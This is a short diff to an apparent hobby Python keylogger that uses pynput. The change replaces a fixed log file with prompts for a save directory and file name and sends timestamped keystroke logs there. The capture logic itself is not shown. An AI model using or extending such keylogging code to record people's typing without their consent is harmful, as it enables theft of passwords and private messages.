@@ -1,8 +1,21 @@
 from pynput.keyboard import Key, Listener
 import logging
+import os
+
+# Get directory or file input
+while True:
+    dir = input(str("Save to directory: "))
+    if(dir[-1] == "/"):
+        dir = dir[:-1] # If directory ends in '/' remove it
+    file = input(str("Save to file: "))
+    if(not(os.path.isdir(dir))):
+        print("\nDirectory doesn't exist, please try again\n")
+        continue
+    else:
+        break
 
 # Log into file
-logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename=(dir + "/" + file), level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 # Array to store keystrokes
 msg = ""
